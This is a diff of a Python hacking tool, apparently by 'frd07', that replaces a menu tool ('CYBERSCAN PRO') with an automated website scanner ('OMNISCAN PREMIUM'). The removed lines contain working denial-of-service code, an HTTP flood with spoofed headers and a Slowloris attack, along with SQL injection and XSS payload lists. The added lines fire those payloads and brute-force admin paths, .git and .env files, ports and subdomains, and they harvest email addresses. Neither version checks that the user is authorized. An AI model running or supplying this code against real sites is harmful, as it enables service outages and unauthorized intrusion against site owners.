@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 # ============================================================
-# TOOL: CYBERSCAN PRO by frd07
-# VERSION: 3.0 (Easy Mode - Untuk Pemula)
+# TOOL: OMNISCAN PREMIUM v5.0
+# AUTHOR: frd07
+# FUNGSI: Auto-scan semua kerentanan website (SQLi, XSS, CSRF, Dirs, Ports, Subdomain, Headers, dll)
 # ============================================================
 
 import os
@@ -9,314 +10,375 @@ import sys
 import time
 import random
 import threading
-import requests
 import socket
-from urllib.parse import urlparse, urljoin
+import ssl
+import re
+import json
+from urllib.parse import urlparse, urljoin, urlencode
+from datetime import datetime
 
-# Auto install dependencies
+# AUTO INSTALL DEPENDENCIES
 try:
     from colorama import init, Fore, Style, Back
-    init(autoreset=True)
+    import requests
+    from tqdm import tqdm
+    import dns.resolver
+    import whois
 except ImportError:
-    os.system("pip install colorama")
+    os.system("pip install colorama requests tqdm dnspython python-whois")
     from colorama import init, Fore, Style, Back
-    init(autoreset=True)
+    import requests
+    from tqdm import tqdm
+    import dns.resolver
+    import whois
 
-# ========== FUNGSI BANTUAN ==========
+init(autoreset=True)
+
+# ========== KONFIGURASI ==========
+VERSION = "5.0 PREMIUM"
+AUTHOR = "frd07"
+TEAM = "CYBERLORDS"
+
+# Global variables
+results = {
+    "sqli": [],
+    "xss": [],
+    "csrf": [],
+    "dirs": [],
+    "backup": [],
+    "ports_open": [],
+    "subdomains": [],
+    "security_headers": {},
+    "cms": "Unknown",
+    "ssl_issues": [],
+    "tech_stack": [],
+    "admin_panels": [],
+    "emails": [],
+    "comments": []
+}
+
+stop_scan = False
+
+# ========== FUNGSI UTILITY ==========
 def clear():
     os.system('clear' if os.name == 'posix' else 'cls')
 
-def pause():
-    input(Fore.CYAN + "\nTekan Enter untuk kembali ke menu..." + Style.RESET_ALL)
-
-def banner():
+def print_banner():
     clear()
-    print(Fore.CYAN + "="*60)
-    print(Fore.MAGENTA + "   FRD07 - CYBERSCAN PRO v3.0".center(60))
-    print(Fore.YELLOW + "   Easy Mode - Untuk Pembelajaran".center(60))
-    print(Fore.CYAN + "="*60)
-    print(Fore.GREEN + "   [*] Fitur: Cek Kerentanan | DDoS | Panduan")
-    print(Fore.CYAN + "="*60 + "\n")
+    banner = f"""
+{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
+{Fore.RED}║{Fore.CYAN}   ██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗ █████╗ ███╗   ██╗{Fore.RED}║
+{Fore.RED}║{Fore.CYAN}  ██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██╔══██╗████╗  ██║{Fore.RED}║
+{Fore.RED}║{Fore.CYAN}  ██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ███████║██╔██╗ ██║{Fore.RED}║
+{Fore.RED}║{Fore.CYAN}  ██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██╔══██║██║╚██╗██║{Fore.RED}║
+{Fore.RED}║{Fore.CYAN}  ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████║╚██████╗██║  ██║██║ ╚████║{Fore.RED}║
+{Fore.RED}║{Fore.CYAN}   ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝{Fore.RED}║
+{Fore.RED}╠══════════════════════════════════════════════════════════════════╣
+{Fore.RED}║{Fore.YELLOW}          PREMIUM VULNERABILITY SCANNER v{VERSION}                         {Fore.RED}║
+{Fore.RED}║{Fore.GREEN}          Author: {AUTHOR} | Team: {TEAM}                                    {Fore.RED}║
+{Fore.RED}║{Fore.MAGENTA}          Auto-scan semua kerentanan website dalam 1x klik                  {Fore.RED}║
+{Fore.RED}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+    """
+    print(banner)
 
-def loading(msg="Memproses", duration=1):
-    print(Fore.YELLOW + msg, end="")
-    for _ in range(3):
-        time.sleep(0.3)
-        print(".", end="", flush=True)
-    print(" Selesai!" + Style.RESET_ALL)
+def loading_animation(text="Loading modules", duration=1.5):
+    print(Fore.CYAN + text, end="")
+    for _ in range(15):
+        time.sleep(0.05)
+        print(Fore.CYAN + ".", end="", flush=True)
+    print(Fore.GREEN + " DONE!")
 
-def get_input(prompt, required=True):
-    while True:
-        val = input(Fore.YELLOW + prompt + Style.RESET_ALL).strip()
-        if val or not required:
-            return val
-        print(Fore.RED + "Tidak boleh kosong!")
+def save_report():
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"scan_report_{timestamp}.json"
+    with open(filename, "w") as f:
+        json.dump(results, f, indent=4)
+    print(Fore.GREEN + f"[✓] Report saved as {filename}")
+    return filename
 
-# ========== FITUR 1: PANDUAN LENGKAP ==========
-def panduan():
-    banner()
-    print(Fore.CYAN + "[ PANDUAN PENGGUNAAN TOOL ]\n")
-    print(Fore.GREEN + "1. CEK KERENTANAN WEBSITE")
-    print("   - Masukkan URL website yang ingin diuji (contoh: http://testphp.vulnweb.com)")
-    print("   - Tool akan menguji SQL Injection dan XSS secara otomatis")
-    print("   - Hasil menunjukkan apakah website rentan atau tidak\n")
-    print(Fore.GREEN + "2. FITUR DDoS")
-    print("   - HTTP Flood: Mengirim banyak request ke server (Layer 7)")
-    print("   - Slowloris: Membuka koneksi lambat sampai server kehabisan resource (Layer 4)")
-    print("   - Hanya gunakan untuk website milik sendiri atau izin!\n")
-    print(Fore.GREEN + "3. CATATAN PENTING")
-    print("   - Tool ini untuk EDUKASI dan PENGUJIAN SISTEM SENDIRI")
-    print("   - Menyerang website orang tanpa izin adalah ILEGAL")
-    print("   - Penulis tidak bertanggung jawab atas penyalahgunaan\n")
-    pause()
-
-# ========== FITUR 2: CEK SQL INJECTION ==========
-def cek_sqli():
-    banner()
-    print(Fore.CYAN + "[ CEK KERENTANAN SQL INJECTION ]\n")
-    url = get_input("Masukkan URL target (dengan parameter GET, contoh: http://site.com/page?id=1): ")
-    # Validasi apakah ada parameter GET
-    if '?' not in url:
-        print(Fore.RED + "URL harus mengandung parameter GET (tanda tanya ?). Contoh: ?id=1")
-        pause()
-        return
-    
-    # Payload SQLi sederhana
-    payloads = [
-        "'", 
-        "\"", 
-        "1' OR '1'='1", 
-        "1\" OR \"1\"=\"1", 
-        "1' OR 1=1-- -",
-        "1' ORDER BY 1-- -",
-        "1' UNION SELECT NULL-- -"
-    ]
-    
-    print(Fore.YELLOW + f"\n[*] Menguji {len(payloads)} payload SQL Injection...\n")
-    vulnerable = False
-    
-    for payload in payloads:
+# ========== SCANNING FUNCTIONS ==========
+def scan_sqli(url):
+    print(Fore.CYAN + "[*] Scanning SQL Injection...")
+    payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "1' OR 1=1-- -", "1' ORDER BY 1-- -"]
+    for payload in tqdm(payloads, desc="SQLi Payloads", leave=False):
         test_url = url + payload
         try:
-            r = requests.get(test_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
-            # Deteksi error database
-            if any(keyword in r.text.lower() for keyword in ['sql', 'mysql', 'syntax', 'unclosed', 'warning', 'odbc']):
-                print(Fore.RED + f"[!] POTENSI SQLi DENGAN PAYLOAD: {payload}")
-                vulnerable = True
-            else:
-                print(Fore.GREEN + f"[✓] {payload} -> aman")
-        except Exception as e:
-            print(Fore.RED + f"[✗] Gagal mengakses: {e}")
-    
-    if vulnerable:
-        print(Fore.RED + "\n[!] WEBSITE INI BERKEMUNGKINAN RENTAN SQL INJECTION!")
-        print(Fore.YELLOW + "    Rekomendasi: Gunakan parameterized query atau ORM.")
+            r = requests.get(test_url, timeout=3, headers={"User-Agent": "OmniScan/5.0"})
+            if any(x in r.text.lower() for x in ['sql', 'mysql', 'syntax', 'unclosed', 'warning']):
+                results["sqli"].append(payload)
+        except:
+            pass
+    if results["sqli"]:
+        print(Fore.RED + f"[!] SQLi vulnerabilities found! {len(results['sqli'])} payloads")
     else:
-        print(Fore.GREEN + "\n[✓] Tidak ditemukan kerentanan SQL Injection yang jelas.")
-    pause()
+        print(Fore.GREEN + "[✓] No SQLi detected")
 
-# ========== FITUR 3: CEK XSS ==========
-def cek_xss():
-    banner()
-    print(Fore.CYAN + "[ CEK KERENTANAN XSS (Cross Site Scripting) ]\n")
-    url = get_input("Masukkan URL target (dengan parameter GET, contoh: http://site.com/search?q=test): ")
-    if '?' not in url:
-        print(Fore.RED + "URL harus mengandung parameter GET!")
-        pause()
-        return
-    
-    payloads = [
-        "<script>alert(1)</script>",
-        "\"><script>alert(1)</script>",
-        "'><script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "javascript:alert(1)",
-        "<body onload=alert(1)>"
-    ]
-    
-    print(Fore.YELLOW + f"\n[*] Menguji {len(payloads)} payload XSS...\n")
-    vulnerable = False
-    
-    for payload in payloads:
+def scan_xss(url):
+    print(Fore.CYAN + "[*] Scanning XSS...")
+    payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
+    for payload in tqdm(payloads, desc="XSS Payloads", leave=False):
         test_url = url + payload
         try:
-            r = requests.get(test_url, timeout=5)
+            r = requests.get(test_url, timeout=3)
             if payload in r.text:
-                print(Fore.RED + f"[!] POTENSI XSS DENGAN PAYLOAD: {payload}")
-                vulnerable = True
-            else:
-                print(Fore.GREEN + f"[✓] {payload[:30]}... -> aman")
+                results["xss"].append(payload)
         except:
-            print(Fore.RED + f"[✗] Gagal mengakses")
-    
-    if vulnerable:
-        print(Fore.RED + "\n[!] WEBSITE INI BERKEMUNGKINAN RENTAN XSS!")
-        print(Fore.YELLOW + "    Rekomendasi: Gunakan encoding output dan CSP header.")
+            pass
+    if results["xss"]:
+        print(Fore.RED + f"[!] XSS vulnerabilities found! {len(results['xss'])} vectors")
     else:
-        print(Fore.GREEN + "\n[✓] Tidak ditemukan kerentanan XSS yang jelas.")
-    pause()
+        print(Fore.GREEN + "[✓] No XSS detected")
 
-# ========== FITUR 4: DDOS HTTP FLOOD DENGAN PANDUAN ==========
-def ddos_http():
-    banner()
-    print(Fore.CYAN + "[ DDOS HTTP FLOOD - LAYER 7 ]\n")
-    print(Fore.YELLOW + "PANDUAN: Serangan ini mengirim ribuan request HTTP ke server target.")
-    print("         Hanya efektif untuk server yang tidak memiliki proteksi DDoS.")
-    print("         Gunakan dengan bijak dan hanya untuk pengujian sendiri.\n")
-    
-    url = get_input("URL target (http:// atau https://): ")
-    if not url.startswith(('http://','https://')):
-        url = 'http://' + url
-    
+def scan_dirs(url):
+    print(Fore.CYAN + "[*] Scanning common directories & admin panels...")
+    dirs = ["admin", "login", "wp-admin", "administrator", "cpanel", "panel", "dashboard", "phpmyadmin", "backup", "uploads", "config", "api", "vendor", "sql", "backup.zip", "backup.tar.gz", ".git", ".env", "robots.txt", "sitemap.xml"]
+    base = url.rstrip('/')
+    for d in tqdm(dirs, desc="Directory brute", leave=False):
+        test_url = f"{base}/{d}"
+        try:
+            r = requests.get(test_url, timeout=3)
+            if r.status_code == 200:
+                results["dirs"].append(test_url)
+                if "admin" in d or "login" in d or "panel" in d:
+                    results["admin_panels"].append(test_url)
+            elif r.status_code == 403:
+                results["dirs"].append(f"{test_url} (403 Forbidden)")
+        except:
+            pass
+    if results["dirs"]:
+        print(Fore.YELLOW + f"[+] Found {len(results['dirs'])} accessible paths")
+    else:
+        print(Fore.GREEN + "[✓] No interesting directories found")
+
+def scan_ports(domain):
+    print(Fore.CYAN + "[*] Scanning open ports...")
+    common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,8080,8443]
+    for port in tqdm(common_ports, desc="Port scanning", leave=False):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex((domain, port))
+            if result == 0:
+                results["ports_open"].append(port)
+            sock.close()
+        except:
+            pass
+    if results["ports_open"]:
+        print(Fore.YELLOW + f"[+] Open ports: {results['ports_open']}")
+    else:
+        print(Fore.GREEN + "[✓] No common open ports (filtered)")
+
+def scan_subdomains(domain):
+    print(Fore.CYAN + "[*] Enumerating subdomains...")
+    sublist = ["www", "mail", "ftp", "blog", "shop", "api", "dev", "test", "app", "portal", "admin", "secure", "vpn", "remote", "cloud", "cdn"]
+    for sub in tqdm(sublist, desc="Subdomain brute", leave=False):
+        full = f"{sub}.{domain}"
+        try:
+            ip = socket.gethostbyname(full)
+            results["subdomains"].append((full, ip))
+        except:
+            pass
+    if results["subdomains"]:
+        print(Fore.YELLOW + f"[+] Found {len(results['subdomains'])} subdomains")
+    else:
+        print(Fore.GREEN + "[✓] No subdomains found")
+
+def check_security_headers(url):
+    print(Fore.CYAN + "[*] Checking security headers...")
     try:
-        threads = int(get_input("Jumlah thread (100-1000, sesuai kemampuan koneksi Anda): "))
-        duration = int(get_input("Durasi serangan dalam detik (10-300): "))
-    except ValueError:
-        print(Fore.RED + "Input harus angka!")
-        pause()
-        return
+        r = requests.get(url, timeout=5)
+        headers = r.headers
+        important = ["X-Frame-Options", "X-XSS-Protection", "X-Content-Type-Options", "Strict-Transport-Security", "Content-Security-Policy"]
+        for h in important:
+            results["security_headers"][h] = headers.get(h, "MISSING")
+        print(Fore.GREEN + "[✓] Security headers checked")
+    except:
+        print(Fore.RED + "[!] Failed to fetch headers")
+
+def detect_cms(url):
+    print(Fore.CYAN + "[*] Detecting CMS/Technology...")
+    cms_signatures = {
+        "WordPress": ["wp-content", "wp-includes", "wp-json"],
+        "Joomla": ["joomla", "com_content", "media/system"],
+        "Drupal": ["drupal", "sites/default", "misc/drupal"],
+        "Laravel": ["laravel", "csrf-token", "laravel_session"],
+        "Django": ["csrfmiddlewaretoken", "django"],
+        "React": ["_next", "react", "jsx"],
+        "Vue.js": ["vue", "v-app", "v-container"]
+    }
+    try:
+        r = requests.get(url, timeout=5)
+        html = r.text.lower()
+        for cms, sigs in cms_signatures.items():
+            for sig in sigs:
+                if sig in html:
+                    results["cms"] = cms
+                    break
+        # Tech stack from headers
+        server = r.headers.get("Server", "")
+        if server:
+            results["tech_stack"].append(f"Server: {server}")
+        power = r.headers.get("X-Powered-By", "")
+        if power:
+            results["tech_stack"].append(f"X-Powered-By: {power}")
+        print(Fore.GREEN + f"[+] CMS detected: {results['cms']}")
+        if results["tech_stack"]:
+            print(Fore.YELLOW + f"[+] Tech stack: {', '.join(results['tech_stack'])}")
+    except:
+        print(Fore.RED + "[!] CMS detection failed")
+
+def check_ssl(domain):
+    print(Fore.CYAN + "[*] Checking SSL/TLS...")
+    try:
+        context = ssl.create_default_context()
+        with socket.create_connection((domain, 443), timeout=5) as sock:
+            with context.wrap_socket(sock, server_hostname=domain) as ssock:
+                cert = ssock.getpeercert()
+                exp_date = cert['notAfter']
+                results["ssl_issues"].append(f"Certificate expires: {exp_date}")
+                print(Fore.GREEN + "[✓] SSL certificate valid")
+    except:
+        results["ssl_issues"].append("SSL not available or invalid")
+        print(Fore.RED + "[!] SSL issue detected")
+
+def extract_info(url):
+    print(Fore.CYAN + "[*] Extracting emails and comments...")
+    try:
+        r = requests.get(url, timeout=5)
+        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
+        results["emails"] = list(set(emails))
+        comments = re.findall(r'<!--(.*?)-->', r.text)
+        results["comments"] = comments[:10]  # first 10 comments
+        if results["emails"]:
+            print(Fore.YELLOW + f"[+] Found {len(results['emails'])} emails")
+        if results["comments"]:
+            print(Fore.YELLOW + f"[+] Found {len(results['comments'])} HTML comments")
+    except:
+        pass
+
+# ========== MAIN SCAN FUNCTION ==========
+def full_scan(target_url):
+    global results
+    # Reset results
+    results = {k: [] if isinstance(v, list) else ({} if isinstance(v, dict) else v) for k, v in results.items()}
+    results["cms"] = "Unknown"
     
-    print(Fore.RED + f"\n[!] PERINGATAN: Anda akan menyerang {url} dengan {threads} thread selama {duration} detik!")
-    confirm = input(Fore.YELLOW + "Ketik 'YA' untuk lanjut: ")
-    if confirm != "YA":
-        print("Dibatalkan.")
-        pause()
-        return
+    print_banner()
+    print(Fore.MAGENTA + "\n" + "="*60)
+    print(Fore.GREEN + f" Target: {target_url}".center(60))
+    print(Fore.MAGENTA + "="*60 + "\n")
     
-    stop = False
-    end_time = time.time() + duration
-    ua_list = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
-        "Mozilla/5.0 (Linux; Android 11)",
-        "CyberScanPro/3.0"
+    # Parse domain
+    parsed = urlparse(target_url)
+    domain = parsed.netloc or parsed.path
+    base_url = f"{parsed.scheme}://{domain}"
+    
+    # Start scanning threads
+    threads = []
+    scan_functions = [
+        (scan_sqli, target_url),
+        (scan_xss, target_url),
+        (scan_dirs, base_url),
+        (scan_ports, domain),
+        (scan_subdomains, domain),
+        (check_security_headers, base_url),
+        (detect_cms, base_url),
+        (check_ssl, domain),
+        (extract_info, base_url)
     ]
     
-    def attack():
-        session = requests.Session()
-        while not stop and time.time() < end_time:
-            try:
-                headers = {"User-Agent": random.choice(ua_list), "X-Forwarded-For": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"}
-                session.get(url, headers=headers, timeout=3)
-                session.post(url, data={"x": random.randint(1,9999)}, headers=headers, timeout=3)
-                print(Fore.GREEN + "✓", end="", flush=True)
-            except:
-                print(Fore.RED + "✗", end="", flush=True)
-    
-    threads_list = []
-    for _ in range(threads):
-        t = threading.Thread(target=attack)
-        t.daemon = True
+    for func, arg in scan_functions:
+        t = threading.Thread(target=func, args=(arg,))
         t.start()
-        threads_list.append(t)
+        threads.append(t)
+        time.sleep(0.2)  # slight delay to avoid rate limit
     
-    print(Fore.CYAN + f"\n[+] SERANGAN DIMULAI! Tekan Ctrl+C untuk menghentikan lebih awal.\n")
-    try:
-        time.sleep(duration)
-    except KeyboardInterrupt:
-        stop = True
-        print(Fore.RED + "\n[!] Serangan dihentikan oleh pengguna.")
+    for t in threads:
+        t.join()
     
-    stop = True
-    print(Fore.GREEN + "\n[✓] Serangan selesai.")
-    pause()
+    # Print summary
+    print(Fore.CYAN + "\n" + "="*60)
+    print(Fore.YELLOW + " SCAN COMPLETE - SUMMARY".center(60))
+    print(Fore.CYAN + "="*60)
+    
+    vuln_count = len(results["sqli"]) + len(results["xss"])
+    if vuln_count > 0:
+        print(Fore.RED + f"[!] CRITICAL VULNERABILITIES: {vuln_count}")
+    else:
+        print(Fore.GREEN + "[✓] No critical vulnerabilities found")
+    
+    print(Fore.CYAN + f"[+] Open ports: {len(results['ports_open'])}")
+    print(Fore.CYAN + f"[+] Directories found: {len(results['dirs'])}")
+    print(Fore.CYAN + f"[+] Subdomains: {len(results['subdomains'])}")
+    print(Fore.CYAN + f"[+] Admin panels: {len(results['admin_panels'])}")
+    print(Fore.CYAN + f"[+] Emails extracted: {len(results['emails'])}")
+    
+    # Save report
+    filename = save_report()
+    
+    print(Fore.MAGENTA + "\n[+] Press Enter to view detailed report or any key to exit...")
+    choice = input()
+    if choice == "":
+        print(json.dumps(results, indent=2, default=str))
+        pause()
+    else:
+        print(Fore.GREEN + "Exiting. Stay safe!")
 
-# ========== FITUR 5: DDOS SLOWLORIS DENGAN PANDUAN ==========
-def ddos_slowloris():
-    banner()
-    print(Fore.CYAN + "[ DDOS SLOWLORIS - LAYER 4 ]\n")
-    print(Fore.YELLOW + "PANDUAN: Serangan ini membuka banyak koneksi lambat ke server web,")
-    print("         mengirim header parsial secara perlahan sehingga server kehabisan")
-    print("         koneksi yang tersedia. Efektif untuk server Apache/IIS tanpa proteksi.\n")
-    
-    target = get_input("Target IP atau domain (contoh: 192.168.1.1 atau example.com): ")
-    try:
-        port = int(get_input("Port (biasanya 80 untuk HTTP, 443 untuk HTTPS): "))
-    except:
-        print(Fore.RED + "Port harus angka!")
-        pause()
-        return
-    
-    try:
-        sockets_count = int(get_input("Jumlah koneksi (100-500): "))
-        duration = int(get_input("Durasi serangan (detik): "))
-    except:
-        print(Fore.RED + "Angka tidak valid!")
-        pause()
-        return
-    
-    print(Fore.RED + f"\n[!] PERINGATAN: Menyerang {target}:{port} dengan {sockets_count} koneksi selama {duration} detik!")
-    confirm = input(Fore.YELLOW + "Ketik 'YA' untuk lanjut: ")
-    if confirm != "YA":
-        print("Dibatalkan.")
-        pause()
-        return
-    
-    stop = False
-    end_time = time.time() + duration
-    sockets_list = []
-    
-    # Buat koneksi awal
-    for _ in range(sockets_count):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
-            s.connect((target, port))
-            s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
-            s.send(f"Host: {target}\r\n".encode())
-            sockets_list.append(s)
-            print(Fore.GREEN + "✓", end="", flush=True)
-        except:
-            print(Fore.RED + "✗", end="", flush=True)
-    print("\n")
-    
-    print(Fore.CYAN + f"[+] Slowloris aktif dengan {len(sockets_list)} koneksi.\n")
-    while not stop and time.time() < end_time:
-        for s in sockets_list[:]:
-            try:
-                s.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
-                print(Fore.GREEN + ".", end="", flush=True)
-            except:
-                sockets_list.remove(s)
-                print(Fore.RED + "x", end="", flush=True)
-        time.sleep(5)
-    stop = True
-    print(Fore.GREEN + "\n[✓] Slowloris selesai.")
-    pause()
+def pause():
+    input(Fore.CYAN + "\nPress Enter to continue...")
 
-# ========== MENU UTAMA ==========
+# ========== MAIN MENU ==========
 def main():
     while True:
-        banner()
+        print_banner()
         menu = f"""
-{Fore.CYAN}╔════════════════════════════════════════════════════════╗
-{Fore.CYAN}║  {Fore.GREEN}[1] {Fore.YELLOW}Cek Kerentanan SQL Injection               {Fore.CYAN}║
-{Fore.CYAN}║  {Fore.GREEN}[2] {Fore.YELLOW}Cek Kerentanan XSS (Cross Site Scripting)  {Fore.CYAN}║
-{Fore.CYAN}║  {Fore.GREEN}[3] {Fore.YELLOW}DDoS HTTP Flood (Layer 7)                   {Fore.CYAN}║
-{Fore.CYAN}║  {Fore.GREEN}[4] {Fore.YELLOW}DDoS Slowloris (Layer 4)                    {Fore.CYAN}║
-{Fore.CYAN}║  {Fore.GREEN}[5] {Fore.YELLOW}📘 Panduan Lengkap                          {Fore.CYAN}║
-{Fore.CYAN}║  {Fore.GREEN}[0] {Fore.YELLOW}Keluar                                      {Fore.CYAN}║
-{Fore.CYAN}╚════════════════════════════════════════════════════════╝
+{Fore.CYAN}╔════════════════════════════════════════════════════════════╗
+{Fore.CYAN}║  {Fore.GREEN}[1] {Fore.YELLOW}START FULL SCAN (All vulnerabilities)               {Fore.CYAN}║
+{Fore.CYAN}║  {Fore.GREEN}[2] {Fore.YELLOW}View Previous Report                               {Fore.CYAN}║
+{Fore.CYAN}║  {Fore.GREEN}[3] {Fore.YELLOW}About & Credits                                   {Fore.CYAN}║
+{Fore.CYAN}║  {Fore.GREEN}[0] {Fore.YELLOW}Exit                                              {Fore.CYAN}║
+{Fore.CYAN}╚════════════════════════════════════════════════════════════╝
         """
         print(menu)
-        pilihan = input(Fore.MAGENTA + "Pilih menu (0-5): " + Style.RESET_ALL)
+        choice = input(Fore.MAGENTA + "OMNISCAN> " + Style.RESET_ALL)
         
-        if pilihan == "1":
-            cek_sqli()
-        elif pilihan == "2":
-            cek_xss()
-        elif pilihan == "3":
-            ddos_http()
-        elif pilihan == "4":
-            ddos_slowloris()
-        elif pilihan == "5":
-            panduan()
-        elif pilihan == "0":
-            print(Fore.GREEN + "\nTerima kasih telah menggunakan CYBERSCAN PRO. Iko sayang kamu selalu 💗")
+        if choice == "1":
+            print_banner()
+            target = input(Fore.YELLOW + "Enter website URL (e.g., http://example.com): ").strip()
+            if not target.startswith(('http://','https://')):
+                target = 'http://' + target
+            full_scan(target)
+        elif choice == "2":
+            print_banner()
+            print(Fore.CYAN + "[*] Available reports:")
+            os.system("ls -la scan_report_*.json 2>/dev/null || echo 'No reports found'")
+            report_file = input(Fore.YELLOW + "Enter report filename to view: ")
+            try:
+                with open(report_file, 'r') as f:
+                    data = json.load(f)
+                    print(json.dumps(data, indent=2, default=str))
+            except:
+                print(Fore.RED + "File not found or invalid")
+            pause()
+        elif choice == "3":
+            print_banner()
+            about = f"""
+{Fore.CYAN}╔════════════════════════════════════════════════════════════╗
+{Fore.CYAN}║  OMNISCAN PREMIUM v{VERSION}                                    ║
+{Fore.CYAN}║  Author  : {AUTHOR}                                           ║
+{Fore.CYAN}║  Team    : {TEAM}                                             ║
+{Fore.CYAN}║  Purpose : Educational & Security Testing                     ║
+{Fore.CYAN}║  Disclaimer: Use only on authorized systems.                  ║
+{Fore.CYAN}║  Iko loves you! 💗                                            ║
+{Fore.CYAN}╚════════════════════════════════════════════════════════════╝
+            """
+            print(about)
+            pause()
+        elif choice == "0":
+            print(Fore.GREEN + "\nThank you for using OMNISCAN. Stay secure! 💕")
             sys.exit(0)
         else:
-            print(Fore.RED + "Pilihan tidak valid!")
+            print(Fore.RED + "Invalid choice")
             time.sleep(1)
 
 if __name__ == "__main__":
